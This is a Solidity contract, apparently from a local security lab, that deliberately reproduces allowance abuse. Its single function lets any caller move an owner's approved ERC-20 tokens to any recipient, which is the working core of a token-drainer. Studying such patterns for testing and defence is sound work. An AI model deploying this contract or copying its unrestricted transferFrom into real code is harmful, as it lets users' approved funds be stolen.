// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Contrat volontairement dangereux pour reproduire l'abus d'une allowance.
/// @dev LOCAL LAB ONLY. Tout appelant peut choisir le propriétaire, le destinataire
///      et le montant ; ERC-20 n'autorise le transfert que si l'allowance le permet.
contract ApprovalDrainer {
    event AllowanceExercised(
        address indexed token,
        address indexed owner,
        address indexed recipient,
        uint256 amount
    );

    error TokenNotContract();
    error ZeroAddress();
    error TransferFailed();

    function exerciseAllowance(address token, address owner, address recipient, uint256 amount) external {
        if (token.code.length == 0) revert TokenNotContract();
        if (owner == address(0) || recipient == address(0)) revert ZeroAddress();
        if (!IERC20(token).transferFrom(owner, recipient, amount)) revert TransferFailed();
        emit AllowanceExercised(token, owner, recipient, amount);
    }
}
